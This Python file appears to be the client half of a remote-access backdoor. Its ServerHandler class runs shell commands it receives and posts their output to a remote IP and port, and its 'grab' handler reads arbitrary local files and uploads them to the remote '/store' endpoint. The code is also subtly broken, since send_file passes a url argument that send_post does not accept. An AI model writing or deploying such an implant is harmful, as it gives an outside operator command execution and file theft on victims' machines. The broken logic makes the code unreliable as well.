from urllib import request, parse
import subprocess
import time
import os


class ServerHandler:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port


    # Data is a dict
    def send_post(self, data):
        url = f'http://{self.ip}:{self.port}'
        data = {"rfile": data}
        data = parse.urlencode(data).encode()
        req = request.Request(url, data=data)
        request.urlopen(req) # send request


    def send_file(self, command):
        try:
            grab, path = command.strip().split(' ')
        except ValueError:
            self.send_post("[-] Invalid grab command (maybe multiple spaces)")
            return

        if not os.path.exists(path):
            self.send_post("[-] Not able to find the file")
            return

        store_url = f'http://{self.ip}:{self.port}/store' # Posts to /store
        with open(path, 'rb') as fp:
            self.send_post(fp.read(), url=store_url)


    def run_command(self, command):
        CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        self.send_post(CMD.stdout.read())
        self.send_post(CMD.stderr.read())

